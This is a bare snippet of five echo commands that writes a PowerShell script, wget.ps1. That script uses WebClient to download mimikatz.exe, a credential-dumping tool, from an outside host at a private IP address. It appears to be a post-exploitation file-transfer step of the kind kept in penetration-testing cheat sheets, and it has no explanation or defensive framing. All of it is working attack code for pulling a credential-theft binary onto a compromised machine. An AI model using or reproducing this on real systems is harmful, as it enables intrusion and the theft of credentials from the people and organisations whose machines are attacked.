echo $storageDir = $pwd >wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.26.31/mimikatz.exe" >>wget.ps1
echo $file = "mimikatz.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
